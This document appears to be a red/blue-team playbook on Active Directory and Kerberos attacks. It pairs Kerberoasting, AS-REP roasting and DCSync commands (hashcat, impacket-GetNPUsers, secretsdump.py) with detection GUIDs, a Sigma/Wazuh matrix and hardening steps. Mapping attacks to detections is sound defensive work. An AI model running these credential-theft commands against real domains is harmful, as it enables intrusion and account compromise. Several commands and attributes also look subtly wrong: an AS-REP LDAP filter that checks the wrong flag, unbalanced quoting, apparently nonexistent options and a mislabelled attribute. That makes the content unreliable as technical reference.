# Playbook - Active Directory / Kerberos Attacks

| Field | Value |
|---|---|
| `playbook_id` | PB-AD-KERBEROS |
| `attack_ids` | T1558.003, T1550.003, T1558.004 |
| `engines` | `05-engines/metasploit/post-exploitation/privesc-map.md` |
| `evasion` | `04-evasion/windows/` |
| `detections` | `06-defense/wazuh/rules/1010-ad.rules`, `06-defense/sigma/ssa_ad_*` |

## 1. Attack map

```
  Password spray            -> T1110.003
  AS-REP roasting           -> T1558.004   (accounts without "do not require Kerberos preauth")
  Kerberoasting            -> T1558.003   (service ticket hash extraction)
  DCSync                   -> T1003.006   (mimikatz lsadump::dcsync)
  SMB relay                -> T1187       (signing + egress filtering are the controls)
  ADCS abuse (ESC1)        -> T1649       (http://ADCS/<CASP>-based URL)
  Constrained delegation    -> T1134.005
  Shadow credentials        -> T1556.003
```

## 2. Pre-flight discovery

```powershell
# who can write a dSACL / who owns the domain object
Get-ADObject -LDAPFilter '(msDS-AllowedToDelegateTo=*)' -Properties * |
  Select-Object DistinguishedName, msDS-AllowedToDelegateTo

# accounts vulnerable to AS-REP roast (no preauth required)
Get-ADUser -LDAPFilter '(!userPassword:1.2.840.113556.1.4.803:=2)(userAccountControl:1.2.840.113556.1.4.803:=512)'

# trusts
Get-ADTrust -Filter * | Select Name, Direction, Type
```

## 3. Kerberoast / AS-REP roast workflow

```bash
# Enumerate SPNs
Get-DomainUser -SPN | Select SamAccountName, ServicePrincipalName
# Crack tickets
hashcat -m 13100 kerberoast.hashes /opt/wordlists/03-wordlists/credentials/rockyou-top10000.txt
john --wordlist=/opt/wordlists/03-wordlists/credentials/rockyou-top10000.txt kerberoast.hashes

# AS-REP roast
Get-DomainUser -ASREPReadable | Select SamAccountName
impacket-GetNPUsers 'domain.local/':' -request
```

## 4. DCSync prerequisites and detection

```bash
# Attack
secretsdump.py 'domain.local/user:pass@dc01' -just-dc-user -just-dc-group -just-dc-pwd

# Detection - 4662 with replication GUIDs on a non-DC host = loud
#   GUID 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2  GetNCChanges
#   GUID 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2  GetDeltas
#   GUID 89e95b76-444d-4c62-991a-0facbeda640c  GetChanges
#   GUID 89e95b77-444d-4c62-991a-0facbeda640c  GetAllChanges
```

**Rule of thumb: 4662 with any of these GUIDs on a host that is not a DC is an
incident, not a curiosity.**

## 5. Detection matrix

| Attack | Windows event | Sigma | Wazuh |
|---|---|---|---|
| AS-REP roast (bulk) | 4768 (0x17, no preauth) | `ssa_ad_asrep_roast.yml` | 86750 |
| Kerberoast (bulk) | 4769 RC4-HMAC count spike | `ssa_ad_kerberoast.yml` | 86751 |
| DCSync | 4662 + replication GUID, non-DC | `ssa_ad_dcsync.yml` | 86752 |
| SMB relay | 4624 type 3 immediately after 5140/5145 | `ssa_ad_smb_relay.yml` | 86753 |
| Shadow creds | 4672 + msDS-credential-linked object | `ssa_ad_shadow_credentials.yml` | 86754 |
| ADCS abuse | outbound http to `http://<CASP>` | `ssa_ad_adcs_abuse.yml` | 86755 |

## 6. Hardening (mapping to `06-defense/hardening/windows-baseline.md`)

1. Disable RC4 / DES crypto (`msDS-SupportedEncryptionTypes` AES only) - kills
   most roasting.
2. `msDS-NoKerberosPreAuthentication = false` for service accounts.
3. Protected Users / authentication policy - restrict NTLM.
4. SMB signing mandatory + egress block on 445.
5. Tiered administration; no domain admin on workstations.
6. Monitor 4662 replication GUIDs at the collector, not at the DC.
